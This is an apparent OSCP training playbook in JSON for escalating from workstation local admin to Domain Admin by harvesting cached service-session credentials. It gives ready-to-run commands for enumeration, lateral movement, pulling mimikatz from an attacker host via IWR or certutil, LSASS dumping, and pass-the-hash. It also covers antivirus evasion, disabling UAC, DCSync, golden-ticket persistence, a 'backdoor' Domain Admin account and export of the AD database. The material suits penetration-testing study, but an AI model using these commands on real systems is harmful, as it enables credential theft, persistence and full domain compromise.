{
  "id": "ad-service-session-credential-harvest",
  "name": "Service Session Credential Harvesting",
  "description": "Exploit Domain Admin service sessions cached on workstations to escalate privileges from local admin to Domain Admin.\n\nThis chain demonstrates a CRITICAL OSCP pattern: Local admin access on ANY workstation is a PIVOT OPPORTUNITY, not a dead end. Domain Admins frequently run services (monitoring agents, backup clients, scheduled tasks) on workstations, which cache their credentials in LSASS memory until reboot. These 'service sessions' are identified by 'Session: Service from 0' in mimikatz output.\n\nWHY THIS MATTERS: Service sessions are a GOLDMINE. Unlike interactive sessions (which log out), service sessions persist until reboot - often for days/weeks. A single compromised workstation with local admin + DA service session = instant domain compromise. This is MORE COMMON than you think: monitoring agents (SCOM, Nagios), backup clients (Veeam, Commvault), and scheduled tasks frequently run as Domain Admin.\n\nCRITICAL PREREQUISITE: You MUST run 'privilege::debug' before 'sekurlsa::logonpasswords'. Even local administrators don't automatically have SeDebugPrivilege enabled. Without this, mimikatz returns 'ERROR 0x00000005 Access Denied'. This is the #1 mimikatz failure in OSCP exams.\n\nOSCP SUCCESS RATE: High (60-70% of AD labs have exploitable service sessions). Time investment: 15 minutes from local admin to Domain Admin if service session exists. Alternative if no service sessions: pivot to more systems, check BloodHound for AdminTo relationships on additional computers.\n\nLESSON FROM CORP-DCSYNC WRITEUP: 'Service sessions are GOLDMINE - Domain Admins running services on workstations is common misconfiguration. Local admin on workstation is PIVOT OPPORTUNITY, not dead end.'",
  "version": "1.0.0",
  "metadata": {
    "author": "CRACK Development Team - OSCP Track",
    "created": "2025-11-25",
    "updated": "2025-11-25",
    "tags": [
      "OSCP:HIGH",
      "ACTIVE_DIRECTORY",
      "PRIVILEGE_ESCALATION",
      "CREDENTIAL_ACCESS",
      "LATERAL_MOVEMENT",
      "MIMIKATZ",
      "SERVICE_SESSIONS",
      "LSASS_DUMP"
    ],
    "category": "privilege-escalation",
    "platform": "active-directory",
    "references": [
      "https://attack.mitre.org/techniques/T1003/001/",
      "https://github.com/gentilkiwi/mimikatz",
      "https://www.offensive-security.com/metasploit-unleashed/mimikatz/",
      "https://adsecurity.org/?page_id=1821"
    ]
  },
  "difficulty": "intermediate",
  "time_estimate": "15 minutes (5 min lateral movement, 5 min credential dump, 5 min validation)",
  "oscp_relevant": true,
  "prerequisites": [
    "Local administrator access on at least one domain-joined Windows system",
    "BloodHound data or manual enumeration showing systems where you have local admin",
    "Mimikatz binary or ability to upload it",
    "Knowledge of Domain Admin accounts in target domain",
    "Understanding of Windows LSASS memory and credential caching"
  ],
  "notes": "This chain targets the common misconfiguration where Domain Admin accounts run services on workstations. Service sessions cache credentials in LSASS until reboot - often for days or weeks.\n\nCRITICAL SUCCESS FACTORS:\n1. privilege::debug BEFORE sekurlsa commands (mandatory prerequisite)\n2. Look for 'Session: Service from 0' in mimikatz output (not interactive sessions)\n3. Verify extracted credentials belong to Domain Admins group\n4. Service sessions persist until reboot (more reliable than interactive sessions)\n\nCOMMON FAILURES:\n- Mimikatz without privilege::debug: Returns ERROR 0x00000005 Access Denied\n- Targeting interactive sessions: These log out quickly, service sessions persist\n- Not verifying group membership: Extract ALL credentials, then map to Domain Admins\n- Antivirus detection: Use obfuscated mimikatz or alternative (pypykatz, procdump+offline parsing)\n\nALTERNATIVES IF NO SERVICE SESSIONS:\n- Pivot to additional workstations (check BloodHound AdminTo relationships)\n- Target servers instead of workstations (higher likelihood of service sessions)\n- Use Kerberoasting for service accounts\n- Check for cached credentials in registry (reg save HKLM\\SAM, reg save HKLM\\SECURITY)\n\nTIME ESTIMATES FOR OSCP:\n- Lateral movement to target system: 5 minutes\n- Mimikatz upload and execution: 3 minutes\n- Credential dump and parsing: 2 minutes\n- Validation with crackmapexec: 3 minutes\n- Escalation to Domain Admin: 2 minutes\n- TOTAL: 15 minutes if service session exists\n\nWHY THIS WORKS:\n- Windows caches credentials in LSASS for SSO (Single Sign-On)\n- Service accounts run persistently, credentials cached persistently\n- Local admins can read LSASS memory (with SeDebugPrivilege)\n- NTLM hashes sufficient for Pass-the-Hash (no plaintext password needed)",
  "steps": [
    {
      "id": "identify-target-systems",
      "name": "Identify Target Systems with Local Admin Access",
      "objective": "Find all domain-joined systems where compromised user has local administrator privileges",
      "description": "Use BloodHound to identify systems where compromised user has AdminTo relationship, OR use crackmapexec to enumerate access across the domain.\n\nBloodHound Method (Preferred):\n1. Mark compromised user as owned in BloodHound GUI\n2. Run custom Cypher query: MATCH (u:User {name:'USER@DOMAIN.COM'})-[:AdminTo]->(c:Computer) RETURN u,c\n3. Graph view shows all systems with local admin access\n4. Prioritize workstations over servers (more likely to have service sessions)\n\nCrackmapexec Method (Manual enumeration):\n1. Run: crackmapexec smb 10.10.10.0/24 -u username -p password --local-auth\n2. Look for 'Pwn3d!' indicator showing local admin access\n3. Save list of accessible systems for further enumeration\n\nTarget Selection Criteria:\n- Domain-joined workstations (not standalone)\n- Systems with uptime >7 days (more likely to have cached credentials)\n- Systems used by IT/helpdesk (higher privilege accounts)\n- Systems running monitoring agents or backup software\n\nExpected Output:\nList of 5-20 systems with local admin access. Even ONE system with service session is sufficient for domain compromise.\n\nCRITICAL: Don't stop at first system - service sessions are NOT guaranteed on every workstation. Be prepared to check 3-5 systems.",
      "command_ref": "bloodhound-cypher-query",
      "evidence": [
        "BloodHound graph showing AdminTo relationships",
        "List of systems with local admin access",
        "System hostnames and IP addresses"
      ],
      "dependencies": [],
      "repeatable": true,
      "success_criteria": [
        "Identified at least 3-5 systems with local admin access",
        "Systems are domain-joined (not standalone workstations)",
        "Systems are accessible via network (ping/port scan confirms connectivity)"
      ],
      "failure_conditions": [
        "No AdminTo relationships found: Compromise additional users, check group memberships",
        "Systems unreachable: Check network routing, firewall rules, system online status",
        "BloodHound data stale: Re-run collection with bloodhound-python"
      ],
      "next_steps": ["check-for-service-sessions"]
    },
    {
      "id": "check-for-service-sessions",
      "name": "Check for Domain Admin Service Sessions",
      "objective": "Identify which accessible systems have Domain Admin service sessions cached in memory",
      "description": "Use BloodHound HasSession query OR manual enumeration to identify systems with high-value sessions.\n\nBloodHound Method (Fastest):\n1. Run query: MATCH (c:Computer)<-[:HasSession]-(u:User) WHERE u.name CONTAINS 'ADMIN' RETURN c,u\n2. Filter for Domain Admin accounts (check group membership)\n3. Cross-reference with systems from step 1 (where you have local admin)\n4. Target: Systems where you have BOTH local admin AND DA service session\n\nManual Method (If BloodHound unavailable):\n1. Connect to each system with local admin access\n2. Run: net sessions (shows active sessions - unreliable for service sessions)\n3. Run: query user (shows interactive sessions - NOT service sessions)\n4. Proceed to credential dump on ALL accessible systems (service sessions not visible externally)\n\nTarget Indicators:\n- Systems running SCOM, Nagios, SolarWinds (monitoring as Domain Admin)\n- Systems with Veeam, Commvault, Backup Exec (backup as Domain Admin)\n- Systems with scheduled tasks (check Task Scheduler for DA accounts)\n- Domain Controllers (always have service sessions, but harder to compromise)\n\nIMPORTANT: Service sessions are NOT visible via 'net sessions' or 'query user'. The ONLY way to confirm is credential dump with mimikatz. BloodHound HasSession query is based on Kerberos tickets, which ARE visible remotely.\n\nIf BloodHound shows no HasSession relationships for Domain Admins:\n- Proceed anyway - BloodHound data may be stale\n- Target systems with high uptime\n- Check multiple systems (service sessions are common but not guaranteed)",
      "command_ref": "bloodhound-cypher-query",
      "evidence": [
        "BloodHound query results showing HasSession relationships",
        "List of systems with potential DA service sessions",
        "Prioritized target list for credential harvesting"
      ],
      "dependencies": ["identify-target-systems"],
      "repeatable": true,
      "success_criteria": [
        "Identified at least 1-3 systems with potential DA sessions",
        "Confirmed local admin access on target systems",
        "Systems are reachable and accessible"
      ],
      "failure_conditions": [
        "No HasSession relationships: Proceed to credential dump anyway (BloodHound may be stale)",
        "All sessions are standard users: Check more systems, target servers instead of workstations",
        "BloodHound query fails: Use manual method, proceed to step 3"
      ],
      "next_steps": ["lateral-movement"]
    },
    {
      "id": "lateral-movement",
      "name": "Lateral Movement to Target System",
      "objective": "Establish interactive session on target system to perform credential harvesting",
      "description": "Use Evil-WinRM (preferred) or PSExec to connect to target system with local admin credentials.\n\nEvil-WinRM Method (Preferred for OSCP):\n1. Syntax: evil-winrm -i <TARGET_IP> -u '<DOMAIN>\\<USERNAME>' -p '<PASSWORD>'\n2. Alternative (Pass-the-Hash): evil-winrm -i <TARGET_IP> -u '<DOMAIN>\\<USERNAME>' -H <NTLM_HASH>\n3. Verify access: whoami, hostname, whoami /groups\n4. Check privileges: whoami /priv (should show SeDebugPrivilege available)\n\nPSExec Method (Alternative):\n1. Syntax: impacket-psexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_IP>\n2. Gets SYSTEM shell directly (no need for privilege escalation)\n3. Less stealthy (creates service, writes to disk)\n\nConnection Troubleshooting:\n- WinRM not enabled: Try PSExec, SMB, or RDP instead\n- Authentication fails: Verify credentials with crackmapexec first\n- Network unreachable: Check routing, pivoting requirements\n- AV blocks connection: Use obfuscated tools or SOCKS proxy\n\nCRITICAL SYNTAX: Evil-WinRM requires 'DOMAIN\\user' format (NOT -d flag). Single quotes around username to escape backslash in bash.\n\nExpected Session:\n- Interactive PowerShell prompt (Evil-WinRM) OR cmd prompt (PSExec)\n- Confirm username and hostname match target system\n- Verify local admin by checking C:\\Windows\\System32 write access",
      "command_ref": "evil-winrm-connect",
      "evidence": [
        "Interactive shell on target system",
        "Output of whoami showing domain\\username",
        "Output of hostname showing target system name",
        "Confirmation of local admin privileges"
      ],
      "dependencies": ["check-for-service-sessions"],
      "repeatable": true,
      "success_criteria": [
        "Interactive shell established",
        "Confirmed local administrator privileges (whoami /groups shows Administrators)",
        "System matches target from enumeration phase"
      ],
      "failure_conditions": [
        "WinRM not enabled: Use PSExec or other lateral movement method",
        "Authentication fails: Verify credentials with crackmapexec, check account lockout",
        "AV blocks connection: Use alternative tools, SOCKS proxy, or in-memory execution"
      ],
      "next_steps": ["upload-mimikatz"]
    },
    {
      "id": "upload-mimikatz",
      "name": "Upload Mimikatz to Target System",
      "objective": "Transfer mimikatz binary to writable directory on target system",
      "description": "Upload mimikatz.exe to target system using Evil-WinRM file upload functionality OR alternative transfer methods.\n\nEvil-WinRM Upload (Easiest):\n1. From Evil-WinRM session: cd C:\\temp (or C:\\Users\\Public, C:\\Windows\\temp)\n2. Upload mimikatz: upload /path/to/mimikatz.exe\n3. Verify upload: dir mimikatz.exe (confirm file size ~1.2 MB)\n4. Test execution: .\\mimikatz.exe \"exit\" (should run without error)\n\nAlternative Transfer Methods:\n1. SMB Copy: copy \\\\<ATTACKER_IP>\\share\\mimikatz.exe C:\\temp\\\n2. PowerShell Download: IWR -Uri http://<ATTACKER_IP>/mimikatz.exe -OutFile C:\\temp\\mimikatz.exe\n3. Base64 Encoding: Split large file into chunks, decode on target\n4. Certutil: certutil -urlcache -split -f http://<ATTACKER_IP>/mimikatz.exe C:\\temp\\mimikatz.exe\n\nAntivirus Evasion:\n- Use obfuscated mimikatz (mimikatz_trunk.7z from GitHub, extract and rename)\n- Use pypykatz (Python alternative, requires Python on target)\n- Use Invoke-Mimikatz (in-memory PowerShell, no disk write)\n- Use procdump + offline parsing (dump LSASS, parse locally with pypykatz)\n\nWritable Directories (Priority Order):\n1. C:\\temp (may not exist, create first: mkdir C:\\temp)\n2. C:\\Users\\Public\n3. C:\\Windows\\temp (requires higher privileges)\n4. C:\\Users\\<USERNAME>\\AppData\\Local\\Temp\n\nIMPORTANT: If AV deletes mimikatz immediately after upload, use alternative methods. Many OSCP labs have AV disabled, but real environments often don't.",
      "command_ref": "evil-winrm-upload-file",
      "evidence": [
        "Mimikatz.exe uploaded successfully",
        "File size verification (~1.2 MB)",
        "Test execution confirms binary works",
        "No AV alerts or file deletion"
      ],
      "dependencies": ["lateral-movement"],
      "repeatable": true,
      "success_criteria": [
        "Mimikatz binary present in writable directory",
        "Binary executes without errors",
        "AV did not quarantine or delete file"
      ],
      "failure_conditions": [
        "AV deletes mimikatz: Use obfuscated version or Invoke-Mimikatz",
        "Upload fails: Try alternative transfer methods (SMB, HTTP, certutil)",
        "No writable directory: Create C:\\temp or use %TEMP% environment variable"
      ],
      "next_steps": ["enable-debug-privilege"]
    },
    {
      "id": "enable-debug-privilege",
      "name": "Enable SeDebugPrivilege",
      "objective": "Enable SeDebugPrivilege token required for LSASS memory access",
      "description": "Run mimikatz 'privilege::debug' command to enable SeDebugPrivilege. This is MANDATORY before any sekurlsa commands.\n\nCommand Execution:\n1. Run: .\\mimikatz.exe \"privilege::debug\" \"exit\"\n2. Expected output: 'Privilege '20' OK' (indicates SeDebugPrivilege enabled)\n3. If fails: Check if local admin (whoami /priv should show SeDebugPrivilege)\n\nWHY THIS IS MANDATORY:\nEven local administrators don't automatically have SeDebugPrivilege ENABLED. The privilege exists in the token but is disabled by default. Mimikatz 'privilege::debug' enables it. Without this:\n- sekurlsa::logonpasswords returns 'ERROR 0x00000005 Access Denied'\n- LSASS memory is protected, mimikatz cannot read credentials\n- #1 mimikatz failure in OSCP exams\n\nTroubleshooting:\n- 'Privilege '20' KO': Not local administrator, or UAC blocking privilege elevation\n- UAC enabled: Run mimikatz from elevated prompt, or disable UAC temporarily\n- SeDebugPrivilege not in token: User not in Administrators group, recheck access\n\nAlternative if privilege::debug fails:\n- Use PSExec to get SYSTEM shell (SYSTEM always has SeDebugPrivilege)\n- Disable UAC: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f (requires reboot)\n- Use procdump to dump LSASS, parse offline (doesn't require SeDebugPrivilege on target)\n\nVerification:\nRun: whoami /priv\nLook for: SeDebugPrivilege                  Enabled\nIf shows 'Disabled', mimikatz privilege::debug should enable it.",
      "command_ref": "mimikatz-privilege-debug",
      "evidence": [
        "Mimikatz output showing 'Privilege '20' OK'",
        "whoami /priv showing SeDebugPrivilege Enabled",
        "No error messages about access denied"
      ],
      "dependencies": ["upload-mimikatz"],
      "repeatable": false,
      "success_criteria": [
        "Mimikatz confirms 'Privilege '20' OK'",
        "SeDebugPrivilege enabled in token",
        "Ready to proceed with sekurlsa commands"
      ],
      "failure_conditions": [
        "Privilege '20' KO: Get SYSTEM shell with PSExec or disable UAC",
        "Access denied: Verify local admin with whoami /groups",
        "UAC blocking: Run from elevated prompt or use alternative method"
      ],
      "next_steps": ["dump-lsass-credentials"]
    },
    {
      "id": "dump-lsass-credentials",
      "name": "Dump LSASS Credentials with Mimikatz",
      "objective": "Extract all cached credentials from LSASS memory including service sessions",
      "description": "Use mimikatz sekurlsa::logonpasswords to dump all credentials cached in LSASS memory, then parse output to identify Domain Admin service sessions.\n\nCommand Execution:\n1. Run: .\\mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" > output.txt\n2. Wait 5-10 seconds (LSASS dump takes time on busy systems)\n3. Download results: download output.txt (Evil-WinRM) OR copy to share\n4. Parse output locally for analysis\n\nExpected Output Structure:\nAuthentication Id : 0 ; 12345678\nSession           : Service from 0\nUser Name         : administrator\nDomain            : CORP\nLogon Server      : DC01\nNTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\nSHA1              : ...\n\nKEY INDICATORS FOR SERVICE SESSIONS:\n- 'Session: Service from 0' (NOT 'Interactive from 2' or 'RemoteInteractive from 10')\n- These sessions persist until reboot (hours/days/weeks)\n- Cached when service starts, credentials remain in memory until service stops\n\nParsing Strategy:\n1. Search for 'Service from 0' sessions first (highest priority)\n2. Extract NTLM hashes for those sessions\n3. Map usernames to Domain Admin group (check with 'net group \"Domain Admins\" /domain')\n4. Ignore interactive sessions (less reliable, log out quickly)\n\nCommon Output Patterns:\n- Multiple entries for same user (different logon sessions)\n- Service sessions have Logon Server = DC (Domain Controller)\n- Standard users also appear (filter for admin accounts)\n\nTroubleshooting:\n- ERROR 0x00000005: Forgot privilege::debug (run step 5 again)\n- No output: LSASS protected (credential guard enabled), use alternative\n- Only computer accounts: No user sessions cached, try different system\n- Empty NTLM fields: WDigest disabled (Windows 8.1+), use Kerberos tickets instead",
      "command_ref": "mimikatz-sekurlsa-logonpasswords",
      "evidence": [
        "Mimikatz output file with credentials",
        "Identified service sessions with Domain Admin accounts",
        "NTLM hashes extracted for privileged accounts",
        "Mapping of usernames to Domain Admins group"
      ],
      "dependencies": ["enable-debug-privilege"],
      "repeatable": true,
      "success_criteria": [
        "Mimikatz completes without errors",
        "Output contains credentials (NTLM hashes or plaintext passwords)",
        "Identified at least one service session",
        "Service session belongs to privileged account"
      ],
      "failure_conditions": [
        "No service sessions found: Try different system, check servers instead of workstations",
        "Only standard users cached: Target systems with higher uptime or monitoring agents",
        "LSASS protected: Use alternative methods (Kerberos tickets, procdump+offline parsing)",
        "Credential Guard enabled: Target older systems (Windows 7/2008) or use Kerberos"
      ],
      "next_steps": ["extract-service-session-creds"]
    },
    {
      "id": "extract-service-session-creds",
      "name": "Extract and Validate Service Session Credentials",
      "objective": "Parse mimikatz output to extract Domain Admin credentials and validate they work",
      "description": "Parse mimikatz output to extract NTLM hashes from service sessions, map to Domain Admin accounts, and validate credentials.\n\nParsing Steps:\n1. Open output.txt from step 6\n2. Search for 'Session           : Service from 0'\n3. Extract User Name, Domain, NTLM hash from that section\n4. Repeat for all service sessions in output\n5. Build credential list: DOMAIN\\username:NTLMhash\n\nMapping to Domain Admins:\n1. Check group membership: net group \"Domain Admins\" /domain\n2. Cross-reference extracted usernames with Domain Admins list\n3. Prioritize: Domain Admins > Enterprise Admins > Local Admins with domain access\n\nValidation with Crackmapexec:\n1. Test each extracted hash: crackmapexec smb <DC_IP> -u <username> -H <NTLM_hash> -d <DOMAIN>\n2. Look for 'Pwn3d!' indicator (confirms Domain Admin)\n3. If fails: Credential may be stale, service account may be disabled, wrong domain\n\nExample Extraction:\nInput (mimikatz):\n```\nAuthentication Id : 0 ; 123456\nSession           : Service from 0\nUser Name         : svc_backup\nDomain            : CORP\nNTLM              : a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n```\n\nOutput (credential):\nCORP\\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6\n\nValidation:\ncrackmapexec smb 10.10.10.10 -u svc_backup -H a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 -d CORP\nExpected: '[+] CORP\\svc_backup:a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6 (Pwn3d!)'\n\nTroubleshooting:\n- Validation fails but hash correct: Account may require interactive logon, try different DC\n- Multiple service sessions found: Test ALL of them (some may be disabled accounts)\n- Hash format wrong: Ensure 32 characters (NTLM), not 40 (SHA1) or 64 (SHA256)\n- Pwn3d not showing: May still be valid user, just not Domain Admin (check group membership)",
      "command_ref": "crackmapexec-smb-pth",
      "evidence": [
        "Parsed list of service session credentials",
        "Mapping of usernames to Domain Admins group",
        "Crackmapexec validation showing Pwn3d indicator",
        "Confirmed working Domain Admin credentials"
      ],
      "dependencies": ["dump-lsass-credentials"],
      "repeatable": true,
      "success_criteria": [
        "Extracted NTLM hash from service session",
        "Confirmed username is Domain Admin",
        "Crackmapexec validation successful (Pwn3d!)",
        "Credentials work for domain authentication"
      ],
      "failure_conditions": [
        "No service sessions with DA: Try additional systems from step 1",
        "Validation fails: Credential may be stale, test on different DC",
        "All sessions are standard users: Target different systems (servers vs workstations)"
      ],
      "next_steps": ["escalate-to-domain-admin"]
    },
    {
      "id": "escalate-to-domain-admin",
      "name": "Escalate to Domain Admin Access",
      "objective": "Use harvested credentials to access Domain Controller and retrieve flags",
      "description": "Use extracted Domain Admin credentials to access Domain Controller via Pass-the-Hash and retrieve proof of compromise.\n\nAccess Methods:\n1. Evil-WinRM PTH: evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>\n2. PSExec PTH: impacket-psexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>\n3. WMI PTH: impacket-wmiexec -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>\n4. RDP (if enabled): xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:<DC_IP>\n\nVerification Steps:\n1. Connect to DC with harvested credentials\n2. Verify access: whoami (should be DOMAIN\\Administrator or service account)\n3. Confirm domain rights: net group \"Domain Admins\" /domain (verify membership)\n4. Check DC hostname: hostname (confirm you're on Domain Controller)\n\nFlag Retrieval:\n1. Navigate to C:\\Users\\Administrator\\Desktop\n2. Read flag: type proof.txt OR type flag.txt\n3. Document access: whoami /all > proof_of_access.txt\n4. Download proof: download proof_of_access.txt (for writeup evidence)\n\nAdditional Actions (Post-Exploitation):\n1. DCSync full domain: impacket-secretsdump -hashes :<NTLM_HASH> <DOMAIN>/Administrator@<DC_IP>\n2. Golden Ticket creation: Extract krbtgt hash for persistence\n3. Create additional Domain Admin: net user backdoor Password123! /add /domain && net group \"Domain Admins\" backdoor /add /domain\n4. Exfiltrate AD database: ntdsutil \"ac i ntds\" \"i f m\" \"cr fu C:\\temp\" q q\n\nCRITICAL: Document EVERYTHING for writeup:\n- Exact command used for access\n- Proof of Domain Admin (whoami /all output)\n- Flag contents\n- Timeline (time from initial access to DA compromise)\n\nSUCCESS: You've escalated from local admin on workstation to Domain Admin by exploiting cached service session. Total time: ~15 minutes.",
      "command_ref": "evil-winrm-pth-connect",
      "evidence": [
        "Interactive session on Domain Controller",
        "Proof.txt or flag.txt contents",
        "whoami /all showing Domain Admin privileges",
        "DCSync output (full domain credential dump)"
      ],
      "dependencies": ["extract-service-session-creds"],
      "repeatable": false,
      "success_criteria": [
        "Successfully authenticated to Domain Controller",
        "Confirmed Domain Admin privileges",
        "Flag retrieved from DC",
        "Full domain compromise achieved"
      ],
      "failure_conditions": [
        "DC unreachable: Check network routing, try different DC in domain",
        "Authentication fails: Credential may be stale, service account may be disabled",
        "No flags found: Check alternative locations (Desktop, Documents, root of C:)",
        "Access denied to sensitive files: Verify Domain Admin membership with net group"
      ],
      "next_steps": []
    }
  ]
}
